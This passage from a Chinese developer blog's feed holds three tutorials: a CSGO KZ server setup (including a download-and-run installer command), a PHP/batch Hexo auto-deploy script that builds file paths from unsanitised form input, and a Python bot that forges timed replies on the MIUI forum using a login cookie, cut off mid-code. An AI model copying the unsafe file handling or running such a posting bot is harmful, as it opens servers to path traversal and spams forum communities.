href="#ubuntu-32-bit"></a> Ubuntu 32-bit</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install mailutils postfix curl wget file bzip2 gzip unzip bsdmainutils python util-linux ca-certificates binutils bc tmux libstdc++6</span><br></pre></td></tr></table></figure><h2 id="debian"><a class="markdownIt-Anchor" href="#debian"></a> Debian</h2><h3 id="debian-64-bit"><a class="markdownIt-Anchor" href="#debian-64-bit"></a> Debian 64-bit</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo dpkg --add-architecture i386; sudo apt update; sudo apt install mailutils postfix curl wget file bzip2 gzip unzip bsdmainutils python util-linux ca-certificates binutils bc tmux lib32gcc1 libstdc++6 libstdc++6:i386</span><br></pre></td></tr></table></figure><h3 id="debian-32-bit"><a class="markdownIt-Anchor" href="#debian-32-bit"></a> Debian 32-bit</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install mailutils postfix curl wget file bzip2 gzip unzip bsdmainutils python util-linux ca-certificates binutils bc tmux libstdc++6</span><br></pre></td></tr></table></figure><h2 id="fedora"><a class="markdownIt-Anchor" href="#fedora"></a> Fedora</h2><h3 id="fedora-64-bit"><a class="markdownIt-Anchor" href="#fedora-64-bit"></a> Fedora 64-bit</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dnf install mailx postfix curl wget file bzip2 gzip unzip python binutils bc tmux glibc.i686 libstdc++ libstdc++.i686</span><br></pre></td></tr></table></figure><h3 id="fedora-32-bit"><a class="markdownIt-Anchor" href="#fedora-32-bit"></a> Fedora 32-bit</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dnf install mailx postfix curl wget file bzip2 gzip unzip python binutils bc tmux libstdc++</span><br></pre></td></tr></table></figure><h2 id="centos"><a class="markdownIt-Anchor" href="#centos"></a> CentOS</h2><h3 id="centos-64-bit"><a class="markdownIt-Anchor" href="#centos-64-bit"></a> CentOS 64-bit</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install mailx postfix curl wget bzip2 gzip unzip python binutils bc tmux glibc.i686 libstdc++ libstdc++.i686</span><br></pre></td></tr></table></figure><h3 id="centos-32-bit"><a class="markdownIt-Anchor" href="#centos-32-bit"></a> CentOS 32-bit</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install mailx postfix curl wget bzip2 gzip unzip python binutils bc tmux libstdc++</span><br></pre></td></tr></table></figure><h1 id="安装csgo服务器"><a class="markdownIt-Anchor" href="#安装csgo服务器"></a> 安装CSGO服务器</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adduser csgoserver</span><br><span class="line">passwd csgoserver    &#x2F;&#x2F;这里可能因服务器而异，我安装时直接让我手动输入密码</span><br><span class="line">su - csgoserver</span><br><span class="line">wget https:&#x2F;&#x2F;linuxgsm.com&#x2F;dl&#x2F;linuxgsm.sh &amp;&amp; chmod +x linuxgsm.sh &amp;&amp; bash linuxgsm.sh csgoserver</span><br><span class="line">.&#x2F;csgoserver install    &#x2F;&#x2F;最后这一步非常慢，需要等一会儿</span><br></pre></td></tr></table></figure><h1 id="下载metamodsourcemod"><a class="markdownIt-Anchor" href="#下载metamodsourcemod"></a> 下载MetaMod&amp;SourceMod</h1><p>  <a href="https://www.sourcemm.net/downloads.php?branch=stable">https://www.sourcemm.net/downloads.php?branch=stable</a></p><p>  选择Linux保存。</p><p>  <a href="http://www.sourcemod.net/downloads.php?branch=stable">http://www.sourcemod.net/downloads.php?branch=stable</a></p><p>  选择Linux保存。</p><p>  解压两个压缩包，包含addons,cfg两个文件夹，合并两个文件夹,上传至服务器serverfiles/csgo下。</p><h1 id="下载kztimer"><a class="markdownIt-Anchor" href="#下载kztimer"></a> 下载KzTimer</h1><p>  <a href="https://bitbucket.org/kztimerglobalteam/kztimerglobal/downloads/">https://bitbucket.org/kztimerglobalteam/kztimerglobal/downloads/</a></p><p>  下载Full Zip,解压后复制到csgo文件夹下。</p><h1 id="服务器配置"><a class="markdownIt-Anchor" href="#服务器配置"></a> 服务器配置</h1><h2 id="添加管理员"><a class="markdownIt-Anchor" href="#添加管理员"></a> 添加管理员</h2><p>  打开<code>csgo\addons\sourcemod\configs\admins_simple.ini</code>。</p><p>  在末尾添加<code>&quot;SteamID&quot; &quot;Z&quot;</code>。</p><p>  SteamID可以访问<code>https://steamid.io</code>获取。</p><p>  <code>&quot;STEAM_0:0:123123123&quot; &quot;Z&quot;</code></p><h2 id="kztimer配置"><a class="markdownIt-Anchor" href="#kztimer配置"></a> KzTimer配置</h2><p>  打开同目录下databases.cfg，在最后一个花括号前添加这些内容:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;kztimer&quot;</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;driver&quot;            &quot;sqlite&quot;</span><br><span class="line">        &quot;host&quot;                &quot;localhost&quot;</span><br><span class="line">        &quot;database&quot;            &quot;kztimer-sqlite&quot;</span><br><span class="line">        &quot;user&quot;                &quot;root&quot;</span><br><span class="line">        &quot;pass&quot;                &quot;&quot;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="steam令牌设置"><a class="markdownIt-Anchor" href="#steam令牌设置"></a> Steam令牌设置</h2><p>  前往<code>https://steamcommunity.com/dev/managegameservers</code></p><p>  游戏的APPID为730，生成令牌，将令牌复制。</p><p>  打开<code>csgo\cfg\csgoserver.cfg</code></p><p>  在最后添加一行：</p><p>  <code>sv_setsteamaccount &quot;令牌&quot;</code></p><h1 id="服务器命令"><a class="markdownIt-Anchor" href="#服务器命令"></a> 服务器命令</h1><ol><li>启动服务器</li></ol><p>  <code>./csgoserver start</code></p><ol start="2"><li>关闭服务器</li></ol><p>  <code>./csgoserver stop</code></p><ol start="3"><li>重启服务器</li></ol><p>  <code>./csgoserver restart</code></p><ol start="4"><li>查看控制台</li></ol><p>  <code>./csgoserver console</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#前言&quot;&gt;&lt;/a&gt; 前言&lt;/h1&gt;
&lt;p&gt;  最近想搭CSGO KZ服务器，却发现以前的一件安装脚本已经无法下载了，而网上很少能看见Linux版本的KZ服务器假设教程，参考Steam社区</summary>
      
    
    
    
    <category term="Linux" scheme="https://coder.lufer.cc/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://coder.lufer.cc/tags/Linux/"/>
    
    <category term="Game" scheme="https://coder.lufer.cc/tags/Game/"/>
    
  </entry>
  
  <entry>
    <title>基于PHP与批处理的Hexo自动部署脚本</title>
    <link href="https://coder.lufer.cc/PHP/%E5%9F%BA%E4%BA%8EPHP%E4%B8%8E%E6%89%B9%E5%A4%84%E7%90%86%E7%9A%84Hexo%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2%E8%84%9A%E6%9C%AC/"/>
    <id>https://coder.lufer.cc/PHP/%E5%9F%BA%E4%BA%8EPHP%E4%B8%8E%E6%89%B9%E5%A4%84%E7%90%86%E7%9A%84Hexo%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2%E8%84%9A%E6%9C%AC/</id>
    <published>2018-06-13T08:23:05.000Z</published>
    <updated>2021-04-06T02:12:29.213Z</updated>
    
    <content type="html"><![CDATA[<h1 id="创建文件"><a class="markdownIt-Anchor" href="#创建文件"></a> 创建文件</h1><p>  建立前端网页，把请求发到PHP后端，然后拼一下内容，操作文件。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//设置一下页面超时时间，不然等全套操作完成就超时了</span></span><br><span class="line">set_time_limit(<span class="number">100</span>);</span><br><span class="line"><span class="comment">//取博文标题</span></span><br><span class="line"><span class="variable">$title</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>];</span><br><span class="line"><span class="comment">//拼文件名</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$title</span>.<span class="string">&quot;.md&quot;</span>;</span><br><span class="line"><span class="comment">//转码，防止中文文件名乱码</span></span><br><span class="line"><span class="variable">$filename</span> = iconv(<span class="string">&#x27;UTF-8&#x27;</span>, <span class="string">&#x27;GB18030&#x27;</span>, <span class="variable">$filename</span>);</span><br><span class="line"><span class="variable">$category</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"><span class="variable">$tags</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;tag&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"><span class="comment">//按默认格式拼接内容</span></span><br><span class="line"><span class="variable">$filestream</span>=<span class="string">&quot;---\n&quot;</span>;</span><br><span class="line"><span class="variable">$filestream</span>=<span class="variable">$filestream</span>.<span class="string">&quot;title: &quot;</span>.<span class="variable">$title</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment">//设置时区，确保date函数取到正确的服务器时间</span></span><br><span class="line">date_default_timezone_set(<span class="string">&quot;Asia/Shanghai&quot;</span>);</span><br><span class="line"><span class="variable">$filestream</span>=<span class="variable">$filestream</span>.<span class="string">&quot;date: &quot;</span>.date(<span class="string">&quot;Y-m-d&quot;</span>).<span class="string">&quot; &quot;</span>.date(<span class="string">&quot;h:i:s&quot;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$category</span>!=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="variable">$filestream</span>=<span class="variable">$filestream</span>.<span class="string">&quot;categories: &quot;</span>.<span class="variable">$category</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$tags</span>!=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="variable">$filestream</span>=<span class="variable">$filestream</span>.<span class="string">&quot;tags: [&quot;</span>.<span class="variable">$tags</span>.<span class="string">&quot;]\n&quot;</span>;</span><br><span class="line"><span class="variable">$filestream</span>=<span class="variable">$filestream</span>.<span class="string">&quot;---\n&quot;</span>;</span><br><span class="line"><span class="variable">$filestream</span>=<span class="variable">$filestream</span>.<span class="variable">$content</span>;</span><br><span class="line"><span class="comment">//拼接目录，写入文件</span></span><br><span class="line"><span class="variable">$newfile</span> = fopen(<span class="string">&quot;./source/_posts/&quot;</span>.<span class="variable">$filename</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$newfile</span>, <span class="variable">$filestream</span>);</span><br><span class="line">fclose(<span class="variable">$newfile</span>);</span><br></pre></td></tr></table></figure><h1 id="调用hexo与git进行自动部署和备份"><a class="markdownIt-Anchor" href="#调用hexo与git进行自动部署和备份"></a> 调用Hexo与Git进行自动部署和备份</h1><p>  用批处理文件调用Hexo命令，以push.bat为例，PHP中先调用push.bat。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exec(<span class="string">&quot;start push.bat&quot;</span>)</span><br></pre></td></tr></table></figure><p>  批处理文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">::切换当前工作目录到Hexo目录下</span><br><span class="line"><span class="built_in">set</span> current_dir=D:\htdocs\Blog</span><br><span class="line">::设置环境变量，注意加上Hexo所在路径</span><br><span class="line"><span class="built_in">set</span> Path=C:\Program Files (x86)\Common Files\Oracle\Java\javapath;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Program Files\QCloud\Monitor\Barad;C:\Program Files\nodejs\;C:\Program Files (x86)\Git\cmd;D:\htdoc\Blog\node_modules\hexo\node_modules\.bin;C:\Users\Administrator\AppData\Roaming\npm;C:\Program Files\Microsoft VS Code\bin</span><br><span class="line"><span class="built_in">set</span> HOMEPATH=\Users\Administrator</span><br><span class="line"><span class="built_in">set</span> HOMEDRIVE=C:</span><br><span class="line"><span class="built_in">set</span> USERNAME=Administrator</span><br><span class="line"><span class="built_in">set</span> USERPROFILE=C:\Users\Administrator</span><br><span class="line"><span class="built_in">set</span> windir=C:\Windows</span><br><span class="line"><span class="built_in">set</span> SystemDrive=C:</span><br><span class="line"><span class="built_in">set</span> SystemRoot=C:\Windows</span><br><span class="line"><span class="built_in">set</span> ALLUSERSPROFILE=C:\ProgramData</span><br><span class="line"><span class="built_in">set</span> APPDATA=C:\Users\Administrator\AppData\Roaming</span><br><span class="line"><span class="built_in">set</span> CommonProgramFiles=C:\Program Files\Common Files</span><br><span class="line"><span class="built_in">set</span> CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files</span><br><span class="line"><span class="built_in">set</span> CommonProgramW6432=C:\Program Files\Common Files</span><br><span class="line"><span class="built_in">set</span> ComSpec=C:\Windows\system32\cmd.exe</span><br><span class="line"><span class="built_in">set</span> FP_NO_HOST_CHECK=NO</span><br><span class="line"><span class="built_in">set</span> JAVA_HOME=C:\Program Files (x86)\Java\jdk1.8.0_171</span><br><span class="line"><span class="built_in">set</span> LOCALAPPDATA=C:\Users\Administrator\AppData\Local</span><br><span class="line"><span class="built_in">set</span> NUMBER_OF_PROCESSORS=1</span><br><span class="line"><span class="built_in">set</span> OS=Windows_NT</span><br><span class="line"><span class="built_in">set</span> ProgramData=C:\ProgramData</span><br><span class="line"><span class="built_in">set</span> ProgramFiles=C:\Program Files</span><br><span class="line"><span class="built_in">set</span> ProgramFiles(x86)=C:\Program Files (x86)</span><br><span class="line"><span class="built_in">set</span> ProgramW6432=C:\Program Files</span><br><span class="line"><span class="built_in">set</span> PSModulePath=C:\Windows\system32\WindowsPowerShell\v1.0\Modules\</span><br><span class="line"><span class="built_in">set</span> PUBLIC=C:\Users\Public</span><br><span class="line">::调用Hexo，把输出保存到deploy.txt 2&gt;&amp;1 代表把异常也输出到该文件</span><br><span class="line">call hexo d -g &gt; deploy.txt 2&gt;&amp;1</span><br><span class="line">调用git，输入list.txt中的命令，进行备份</span><br><span class="line">call <span class="string">&quot;C:\Program Files (x86)\Git\bin\sh.exe&quot;</span> --login -i &lt;list.txt</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>  list.txt命令内容：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">git add -A .</span><br><span class="line">git commit -m &quot;backup&quot;</span><br><span class="line">git push origin backup</span><br></pre></td></tr></table></figure><h1 id="坑"><a class="markdownIt-Anchor" href="#坑"></a> 坑</h1><h2 id="环境变量"><a class="markdownIt-Anchor" href="#环境变量"></a> 环境变量</h2><p>  exec中调用的bat文件，读取不到系统的环境变量，需要在批处理文件中手动设定环境变量。</p><p>  打开cmd输入set，会输出所有的环境变量，在bat里面进行set</p><p>  主要设定PATH和USERNAME，USERPROFILE等，不然git会找不到config</p><h2 id="git-config"><a class="markdownIt-Anchor" href="#git-config"></a> Git Config</h2><p>  exec中调用git，可能会存在读取不到用户config的问题，可以在项目的.git目录下修改config文件，手动指定用户。</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">[user]</span><br><span class="line">    name=name</span><br><span class="line">    email=email@email.com</span><br></pre></td></tr></table></figure><h2 id="git连接方式"><a class="markdownIt-Anchor" href="#git连接方式"></a> Git连接方式</h2><p>  一定要用SSH，用HTTPS会需要输入密码，然而exec是在后台执行的，根本没有输入密码的机会！！！！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;创建文件&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#创建文件&quot;&gt;&lt;/a&gt; 创建文件&lt;/h1&gt;
&lt;p&gt;  建立前端网页，把请求发到PHP后端，然后拼一下内容，操作文件。&lt;/p&gt;
&lt;figure class=&quot;highlight php</summary>
      
    
    
    
    <category term="PHP" scheme="https://coder.lufer.cc/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://coder.lufer.cc/tags/PHP/"/>
    
    <category term="Bat" scheme="https://coder.lufer.cc/tags/Bat/"/>
    
  </entry>
  
  <entry>
    <title>小米论坛自动回帖脚本实现-Python版</title>
    <link href="https://coder.lufer.cc/Python/%E5%B0%8F%E7%B1%B3%E8%AE%BA%E5%9D%9B%E8%87%AA%E5%8A%A8%E5%9B%9E%E5%B8%96%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0/"/>
    <id>https://coder.lufer.cc/Python/%E5%B0%8F%E7%B1%B3%E8%AE%BA%E5%9D%9B%E8%87%AA%E5%8A%A8%E5%9B%9E%E5%B8%96%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0/</id>
    <published>2018-06-11T10:35:45.000Z</published>
    <updated>2021-04-06T02:13:12.026Z</updated>
    
    <content type="html"><![CDATA[<h1 id="工作原理"><a class="markdownIt-Anchor" href="#工作原理"></a> 工作原理</h1><p>  先获取某个板块的Html页面，用正则表达式获取其中的帖子列表，然后随机抽一个。</p><p>  获取帖子的标题，去生成比较靠谱的回复内容。</p><p>  然后伪造回帖请求，完成回复。</p><h1 id="主要技术"><a class="markdownIt-Anchor" href="#主要技术"></a> 主要技术</h1><h2 id="urllibrequest"><a class="markdownIt-Anchor" href="#urllibrequest"></a> urllib.request</h2><p>  python中HTTP请求的发送可以通过urllib库实现。</p><p>  构造请求头：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">headers = &#123;<span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;www.miui.com&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip,deflate&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Cookie&#x27;</span>: cookie,</span><br><span class="line">            <span class="string">&#x27;Referer&#x27;</span>: refer,</span><br><span class="line">            <span class="string">&#x27;Pragma&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Cache-Control&#x27;</span>:<span class="string">&#x27;no-cache&#x27;</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>  构造附带的post数据：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">post=&#123;<span class="string">&#x27;message&#x27;</span>: messge, <span class="string">&#x27;posttime&#x27;</span>: <span class="built_in">int</span>(ans_time), <span class="string">&#x27;formhash&#x27;</span>: <span class="built_in">hash</span>, <span class="string">&#x27;usesig&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;subject&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">//转成url中的字符串对象</span><br><span class="line">data = urllib.parse.urlencode(post)</span><br></pre></td></tr></table></figure><p>  发送请求：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">//data要先encode成byte格式才能发送</span><br><span class="line">req = urllib2.Request(url, data.encode(<span class="string">&quot;utf-8&quot;</span>),headers)</span><br></pre></td></tr></table></figure><h2 id="正则表达式"><a class="markdownIt-Anchor" href="#正则表达式"></a> 正则表达式</h2><p>  使用re.complie来实现。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">//re.complie(正则表达式)</span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;a href=&quot;(.*?.html)&quot; onclick=.*?&gt;&#x27;</span>)   <span class="comment"># 查找数字</span></span><br><span class="line">//patten.findall(要进行匹配的字符串)，返回所有匹配结果的<span class="built_in">list</span></span><br><span class="line">threadlist = pattern.findall(res)</span><br></pre></td></tr></table></figure><h2 id="定时器"><a class="markdownIt-Anchor" href="#定时器"></a> 定时器</h2><p>20s触发一次回帖</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mainfunc</span>:</span></span><br><span class="line">    //函数内部的timer循环调用</span><br><span class="line">    <span class="keyword">global</span> timer</span><br><span class="line">    timer = threading.Timer(<span class="number">20</span>, mainfunc)</span><br><span class="line">    timer.start()</span><br></pre></td></tr></table></figure><h1 id="全部代码"><a class="markdownIt-Anchor" href="#全部代码"></a> 全部代码</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request <span class="keyword">as</span> urllib2</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">//设置自己的cookie</span><br><span class="line">cookie=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">//分带post内容与不带参数版本</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fetch</span>(<span class="params">url,refer</span>):</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;www.miui.com&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip,deflate&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Cookie&#x27;</span>: cookie,</span><br><span class="line">            <span class="string">&#x27;Referer&#x27;</span>: refer,</span><br><span class="line">            <span class="string">&#x27;Pragma&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Cache-Control&#x27;</span>:<span class="string">&#x27;no-cache&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    req = urllib2.Request(url, <span class="literal">None</span>, headers)</span><br><span class="line">    response = urllib2.urlopen(req)</span><br><span class="line">    page_source = response.read()</span><br><span class="line">    <span class="keyword">return</span> page_source</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fetch2</span>(<span class="params">url,refer,post</span>):</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;www.miui.com&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip,deflate&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Cookie&#x27;</span>: cookie,</span><br><span class="line">            <span class="string">&#x27;Referer&#x27;</span>: refer,</span><br><span class="line">            <span class="string">&#x27;Pragma&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Cache-Control&#x27;</span>:<span class="string">&#x27;no-cache&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = urllib.parse.urlencode(post)</span><br><span class="line">    req = urllib2.Request(url, data.encode(<span class="string">&quot;utf-8&quot;</span>),headers)</span><br><span class="line">    response = urllib2.urlopen(req)</span><br><span class="line">    page_source = response.read()</span><br><span class="line">    <span class="keyword">return</span> page_source</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mainfunc</span>():</span></span><br><span class="line">    //在外部引用re会报错，函数内部无法使用re.complie 不知道为啥</span><br><span class="line">    <span class="keyword">import</span> re</span><br><span class="line">    //在gid=<span class="number">14</span>的板块下随机获取一个页面</span><br><span class="line">    url=<span class="string">&#x27;http://www.miui.com/forum.php?gid=14&amp;page=&#x27;</span>+<span class="built_in">str</span>(random.randint(<span class="number">1</span>,<span class="number">24</span>))</span><br><span class="line">    html = fetch(url,<span class="string">&#x27;http://www.miui.com/index.html&#x27;</span>)</span><br><span class="line">    res=html.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    //获取其中所有的帖子标题</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;a href=&quot;(.*?.html)&quot; onclick=.*?&gt;&#x27;</span>) </span><br><span class="line">    threadlist = pattern.findall(res)</span><br><span class="line">    //筛选，把不是帖子的和不是第一页的去掉，其实没啥用</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> threadlist:</span><br><span class="line">        <span class="keyword">if</span> i.find(<span class="string">&#x27;thread-&#x27;</span>)==<span class="string">&#x27;-1&#x27;</span>:</span><br><span class="line">            threadlist.remove(i)</span><br><span class="line">        <span class="keyword">if</span> i.find(<span class="string">&#x27;-1-1.html&#x27;</span>)==<span class="string">&#x27;-1&#x27;</span>:</span><br><span class="line">            threadlist.remove(i)</span><br><span class="line">    //<span class="built_in">list</span>去重</span><br><span class="line">    threadlist = <span class="built_in">list</span>(<span class="built_in">set</span>(threadlist))</span><br><span class="line">    //从<span class="built_in">list</span>中随机取一个进行恢复</span><br><span class="line">    refer= <span class="string">&#x27;http://www.miui.com/&#x27;</span>+threadlist[random.randint(<span class="number">0</span>,<span class="built_in">len</span>(threadlist)-<span class="number">1</span>)]</span><br><span class="line">    //获取帖子内容</span><br><span class="line">    html = fetch(refer,<span class="string">&#x27;http://www.miui.com/index.html&#x27;</span>)</span><br><span class="line">    res=html.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    //找到帖子的回复网址</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;action=\&quot;(.*?)\&quot;&#x27;</span>)</span><br><span class="line">    threadpage = pattern.findall(res)</span><br><span class="line">    reply = threadpage[<span class="number">1</span>];</span><br><span class="line">    //reply中把所有的&amp;转义成了&amp;amp;,手动拼回来</span><br><span class="line">    replylist=reply.split(<span class="string">&quot;&amp;amp;&quot;</span>)</span><br><span class="line">    reply=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> replylist:</span><br><span class="line">        reply=reply+i+<span class="string">&quot;&amp;&quot;</span></span><br><span class="line">    //构造请求网址</span><br><span class="line">    url=<span class="string">&#x27;http://www.miui.com/&#x27;</span>+reply+<span class="string">&#x27;inajax=1&#x27;</span></span><br><span class="line">    //获取用户的表单<span class="built_in">hash</span>验证值</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;input type=&quot;hidden&quot; name=&quot;formhash&quot; value=&quot;(.*?)&quot; \/&gt;&#x27;</span>)</span><br><span class="line">    temp = pattern.findall(res)</span><br><span class="line">    <span class="built_in">hash</span>=temp[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">hash</span>=<span class="built_in">hash</span>+<span class="string">&quot;:&quot;</span>+<span class="built_in">hash</span>[::-<span class="number">1</span>]</span><br><span class="line">    //获取帖子主题</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;meta name=&quot;description&quot; content=&quot;(.*?)&quot;\/&gt;&#x27;</span>)</span><br><span class="line">    temp = pattern.findall(res)</span><br><span class="line">    content=temp[<span class="number">0</span>]</span><br><span class="line">    